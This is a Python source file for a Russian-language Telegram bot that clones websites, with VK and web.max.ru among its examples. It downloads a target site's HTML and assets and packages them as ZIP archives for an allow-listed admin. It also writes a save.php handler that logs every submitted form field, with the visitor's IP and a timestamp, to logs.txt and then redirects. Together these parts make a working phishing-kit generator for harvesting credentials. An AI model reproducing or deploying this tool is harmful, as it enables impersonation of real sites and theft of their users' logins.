import telebot
import requests
from bs4 import BeautifulSoup
import os
import shutil
from urllib.parse import urljoin, urlparse
import zipfile
import threading
import time
import json
import re
import subprocess
from flask import Flask, request

# ========== КОНФИГ ==========
BOT_TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_ID = int(os.environ.get('ADMIN_ID', 0))
ALLOWED_USERS = [ADMIN_ID]
ACTIVE_TASKS = {}

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running!"

# ========== ПРОВЕРКА И УСТАНОВКА ЗАВИСИМОСТЕЙ ==========
def install_playwright():
    """Пытается установить Playwright если возможно"""
    try:
        subprocess.run(['playwright', 'install', 'chromium'], 
                      capture_output=True, timeout=120)
        return True
    except:
        return False

# ========== УНИВЕРСАЛЬНЫЙ КЛОНЕР ==========
class UniversalCloner:
    def __init__(self, target_url, task_id, chat_id):
        self.target_url = target_url.rstrip('/')
        self.task_id = task_id
        self.chat_id = chat_id
        self.output_dir = f"/tmp/clones/{task_id}"
        self.domain = urlparse(target_url).netloc
        
        os.makedirs(self.output_dir, exist_ok=True)
        for folder in ['css', 'js', 'images', 'fonts', 'static']:
            os.makedirs(f"{self.output_dir}/{folder}", exist_ok=True)
        
        self.session = requests.Session()
        self.assets_count = 0
        self.errors = []
    
    def download_asset(self, url, folder):
        """Скачивает ассет с авто-определением типа"""
        try:
            if not url or url.startswith('data:') or url.startswith('blob:'):
                return None
            
            if not url.startswith('http'):
                url = urljoin(self.target_url, url)
            
            # Фильтруем внешние домены
            parsed = urlparse(url)
            domain_ok = any(d in parsed.netloc for d in [self.domain, 'vk.com', 'userapi.com', 'vkuser.net'])
            
            if not domain_ok and self.domain not in parsed.netloc:
                return None
            
            # Имя файла
            filename = os.path.basename(parsed.path.split('?')[0])
            if not filename or len(filename) < 2:
                ext = '.bin'
                if '.css' in url: ext = '.css'
                elif '.js' in url: ext = '.js'
                elif '.woff' in url: ext = '.woff'
                elif '.woff2' in url: ext = '.woff2'
                elif '.ttf' in url: ext = '.ttf'
                elif '.svg' in url: ext = '.svg'
                elif '.png' in url: ext = '.png'
                elif '.jpg' in url or '.jpeg' in url: ext = '.jpg'
                elif '.ico' in url: ext = '.ico'
                filename = f"asset_{hash(url) % 100000}{ext}"
            
            filepath = f"{self.output_dir}/{folder}/{filename}"
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15',
                'Referer': self.target_url,
                'Origin': f"{parsed.scheme}://{parsed.netloc}",
                'Accept': '*/*'
            }
            
            resp = self.session.get(url, headers=headers, timeout=15, allow_redirects=True)
            
            if resp.status_code == 200 and len(resp.content) > 50:
                with open(filepath, 'wb') as f:
                    f.write(resp.content)
                self.assets_count += 1
                return f"{folder}/{filename}"
            
        except Exception as e:
            self.errors.append(str(e)[:50])
        return None
    
    def clone_smart(self):
        """Умное клонирование с авто-определением типа сайта"""
        
        bot.send_message(self.chat_id, f"🔍 Анализирую {self.target_url}...")
        
        # Пробуем разные User-Agent
        user_agents = [
            # Мобильный
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15',
            # Десктопный
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            # Старый мобильный
            'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36',
        ]
        
        response = None
        worked_ua = None
        
        for ua in user_agents:
            try:
                headers = {
                    'User-Agent': ua,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'ru-RU,ru;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Cache-Control': 'no-cache',
                }
                
                resp = self.session.get(self.target_url, headers=headers, 
                                       allow_redirects=True, timeout=20)
                
                if resp.status_code == 200 and len(resp.text) > 500:
                    response = resp
                    worked_ua = ua
                    break
            except:
                continue
        
        if not response:
            bot.send_message(self.chat_id, "❌ Сайт недоступен")
            return None
        
        final_url = response.url
        bot.send_message(self.chat_id, f"✅ Загружено!\n📍 {final_url}\n📏 Размер: {len(response.text)} символов")
        
        # Сохраняем сырой HTML
        with open(f'{self.output_dir}/source.html', 'w', encoding='utf-8') as f:
            f.write(response.text)
        
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # === СКАЧИВАЕМ ВСЕ РЕСУРСЫ ===
        
        # 1. CSS файлы
        bot.send_message(self.chat_id, "📥 Скачиваю CSS...")
        for tag in soup.find_all('link', href=True):
            href = tag['href'].strip()
            if any(x in href.lower() for x in ['.css', 'stylesheet', 'style']):
                if not href.startswith('http') or self.domain in href:
                    local = self.download_asset(href, 'css')
                    if local:
                        tag['href'] = local
        
        # 2. JavaScript
        bot.send_message(self.chat_id, "📥 Скачиваю JavaScript...")
        for tag in soup.find_all('script', src=True):
            src = tag['src'].strip()
            if src and not src.startswith('data:'):
                local = self.download_asset(src, 'js')
                if local:
                    tag['src'] = local
        
        # 3. Изображения
        bot.send_message(self.chat_id, "📥 Скачиваю изображения...")
        for tag in soup.find_all('img', src=True):
            local = self.download_asset(tag['src'].strip(), 'images')
            if local:
                tag['src'] = local
        
        # 4. Favicon
        for tag in soup.find_all('link', rel=lambda x: x and 'icon' in str(x).lower()):
            local = self.download_asset(tag.get('href', ''), 'images')
            if local:
                tag['href'] = local
        
        # 5. Шрифты
        for tag in soup.find_all('link', href=True):
            if any(x in tag['href'].lower() for x in ['.woff', '.ttf', '.eot', 'font']):
                local = self.download_asset(tag['href'], 'fonts')
                if local:
                    tag['href'] = local
        
        # 6. Фоновые изображения из style
        for tag in soup.find_all(style=True):
            style_text = str(tag['style'])
            urls = re.findall(r'url\(["\']?([^"\'()]+)["\']?\)', style_text)
            for url in urls:
                local = self.download_asset(url.strip(), 'images')
                if local:
                    style_text = style_text.replace(url, local)
            tag['style'] = style_text
        
        # 7. Исправляем все внутренние ссылки
        for tag in soup.find_all(href=True):
            href = tag['href']
            if href.startswith('/'):
                tag['href'] = href
            elif self.domain in href:
                tag['href'] = urlparse(href).path or '/'
        
        for tag in soup.find_all(src=True):
            src = tag['src']
            if src.startswith('/'):
                tag['src'] = src
            elif self.domain in src:
                tag['src'] = urlparse(src).path or src
        
        # === СОХРАНЯЕМ ===
        
        # Обработчик форм
        with open(f'{self.output_dir}/save.php', 'w') as f:
            f.write('<?php\n$d=$_POST;$d["ip"]=$_SERVER["REMOTE_ADDR"];\n$d["time"]=date("Y-m-d H:i:s");\nfile_put_contents("logs.txt",json_encode($d)."\\n",FILE_APPEND);\nheader("Location: /");')
        
        # Главная страница
        with open(f'{self.output_dir}/index.html', 'w', encoding='utf-8') as f:
            f.write('<!DOCTYPE html>\n')
            f.write('<html lang="ru">\n')
            f.write('<head>\n')
            f.write('<meta charset="UTF-8">\n')
            f.write('<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">\n')
            f.write(f'<title>{self.domain}</title>\n')
            
            # CSS первым
            for tag in soup.find_all('link', href=True):
                if '.css' in tag.get('href', ''):
                    f.write(str(tag) + '\n')
            
            f.write('</head>\n')
            f.write('<body>\n')
            f.write(str(soup.find('body') or soup))
            f.write('\n</body>\n')
            f.write('</html>')
        
        # Инфо
        info = {
            'url': self.target_url,
            'final_url': final_url,
            'domain': self.domain,
            'user_agent': worked_ua,
            'assets': self.assets_count,
            'errors': len(self.errors),
            'timestamp': time.ctime()
        }
        
        with open(f'{self.output_dir}/info.json', 'w') as f:
            json.dump(info, f, indent=2)
        
        return info
    
    def try_playwright_clone(self):
        """Пробует клонировать через Playwright если доступен"""
        try:
            from playwright.sync_api import sync_playwright
            
            bot.send_message(self.chat_id, "🎨 Запускаю рендеринг через браузер...")
            
            with sync_playwright() as p:
                browser = p.chromium.launch(headless=True)
                page = browser.new_page(viewport={'width': 390, 'height': 844})
                
                page.goto(self.target_url, wait_until='networkidle', timeout=30000)
                page.wait_for_timeout(3000)
                
                # Скриншот
                page.screenshot(path=f'{self.output_dir}/preview.png', full_page=True)
                
                # HTML после JS
                html = page.content()
                
                browser.close()
            
            # Сохраняем
            with open(f'{self.output_dir}/index.html', 'w', encoding='utf-8') as f:
                f.write(html)
            
            return {'method': 'playwright', 'assets': self.assets_count}
            
        except ImportError:
            return None
        except Exception as e:
            return None

# ========== КОМАНДЫ ==========

@bot.message_handler(commands=['start'])
def start(message):
    if message.from_user.id not in ALLOWED_USERS:
        bot.reply_to(message, "⛔ Доступ запрещён")
        return
    
    bot.reply_to(message, """
🚀 КЛОНЕР САЙТОВ v3.0 (СТАБИЛЬНЫЙ)

Работает БЕЗ Playwright!

Команды:
/clone URL — клонировать любой сайт
/clone_mob URL — мобильная версия
/list — готовые клоны
/get ID — скачать ZIP
/install_pw — установить Playwright (опционально)

Примеры:
/clone https://web.max.ru
/clone https://vk.com
/clone_mob https://m.vk.com
""")

@bot.message_handler(commands=['install_pw'])
def install_pw(message):
    if message.from_user.id not in ALLOWED_USERS:
        return
    
    msg = bot.reply_to(message, "⏳ Устанавливаю Playwright...")
    
    def do_install():
        success = install_playwright()
        if success:
            bot.edit_message_text("✅ Playwright установлен!", message.chat.id, msg.message_id)
        else:
            bot.edit_message_text("❌ Не удалось. Используй базовый режим.", message.chat.id, msg.message_id)
    
    threading.Thread(target=do_install).start()

@bot.message_handler(commands=['clone', 'clone_mob'])
def clone_site(message):
    if message.from_user.id not in ALLOWED_USERS:
        bot.reply_to(message, "⛔ Доступ запрещён")
        return
    
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "❌ Укажи URL")
        return
    
    url = args[1]
    if not url.startswith('http'):
        url = 'https://' + url
    
    # Если мобильная версия - добавляем m.
    if message.text.startswith('/clone_mob'):
        domain = urlparse(url).netloc
        if not domain.startswith('m.'):
            url = url.replace(domain, f'm.{domain}')
    
    task_id = str(int(time.time()))[-8:]
    ACTIVE_TASKS[task_id] = {
        'url': url,
        'status': 'cloning',
        'chat_id': message.chat.id,
        'started': time.time()
    }
    
    msg = bot.reply_to(message, f"🔔 #{task_id}\n🎯 {url}\n⏳ Клонирую...")
    
    def process():
        cloner = UniversalCloner(url, task_id, message.chat.id)
        
        # Сначала обычный метод
        result = cloner.clone_smart()
        
        # Если не вышло - пробуем Playwright
        if not result or cloner.assets_count < 3:
            pw_result = cloner.try_playwright_clone()
            if pw_result:
                result = pw_result
        
        if result:
            # Архив
            zip_path = f"/tmp/clones/{task_id}.zip"
            shutil.make_archive(f"/tmp/clones/{task_id}", 'zip', cloner.output_dir)
            
            if os.path.exists(zip_path):
                ACTIVE_TASKS[task_id]['status'] = 'done'
                ACTIVE_TASKS[task_id]['file'] = zip_path
                
                size_mb = os.path.getsize(zip_path) / (1024 * 1024)
                
                # Скриншот если есть
                preview = f"{cloner.output_dir}/preview.png"
                if os.path.exists(preview):
                    with open(preview, 'rb') as pf:
                        bot.send_photo(message.chat.id, pf, 
                                     caption=f"✅ #{task_id}\n📦 {size_mb:.1f} MB\n📎 Ресурсов: {result.get('assets', 0)}")
                else:
                    bot.send_message(message.chat.id, 
                                   f"✅ #{task_id} готов!\n📦 {size_mb:.1f} MB\n📎 Ресурсов: {result.get('assets', 0)}")
                
                bot.send_message(message.chat.id, f"📥 /get {task_id}")
            else:
                bot.send_message(message.chat.id, f"❌ #{task_id} Ошибка архивации")
        else:
            bot.send_message(message.chat.id, f"❌ #{task_id} Не удалось клонировать")
    
    threading.Thread(target=process).start()

@bot.message_handler(commands=['get'])
def get_file(message):
    if message.from_user.id not in ALLOWED_USERS:
        return
    
    args = message.text.split()
    if len(args) < 2:
        return
    
    task_id = args[1]
    task = ACTIVE_TASKS.get(task_id)
    
    if not task or task['status'] != 'done':
        bot.reply_to(message, "❌ Файл не готов")
        return
    
    filepath = task.get('file')
    if not filepath or not os.path.exists(filepath):
        bot.reply_to(message, "❌ Файл не найден")
        return
    
    safe_name = task['url'].replace('https://','').replace('http://','').replace('/','_')[:50]
    
    with open(filepath, 'rb') as f:
        bot.send_document(message.chat.id, f, 
                         visible_file_name=f"clone_{safe_name}_{task_id}.zip")

@bot.message_handler(commands=['list'])
def list_clones(message):
    if message.from_user.id not in ALLOWED_USERS:
        return
    
    done = {k: v for k, v in ACTIVE_TASKS.items() if v['status'] == 'done'}
    
    if not done:
        bot.reply_to(message, "📭 Нет готовых клонов")
        return
    
    text = "📦 ГОТОВЫЕ КЛОНЫ:\n\n"
    for tid, t in done.items():
        try:
            size = os.path.getsize(t['file']) / (1024 * 1024)
            text += f"#{tid} | {size:.1f}MB | {t['url'][:40]}\n/get {tid}\n\n"
        except:
            pass
    
    bot.reply_to(message, text)

@bot.message_handler(commands=['status'])
def status(message):
    if not ACTIVE_TASKS:
        bot.reply_to(message, "📭 Нет задач")
        return
    
    text = "📊 ЗАДАЧИ:\n\n"
    for tid, t in ACTIVE_TASKS.items():
        e = {'cloning':'⏳','done':'✅','failed':'❌'}.get(t['status'],'❓')
        text += f"{e} #{tid} | {t['url'][:50]}\n"
    
    bot.reply_to(message, text)

# ========== ЗАПУСК ==========
def run_bot():
    bot.infinity_polling()

if __name__ == '__main__':
    print("🚀 Клонер v3.0 запущен (без Playwright)")
    threading.Thread(target=run_bot).start()
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
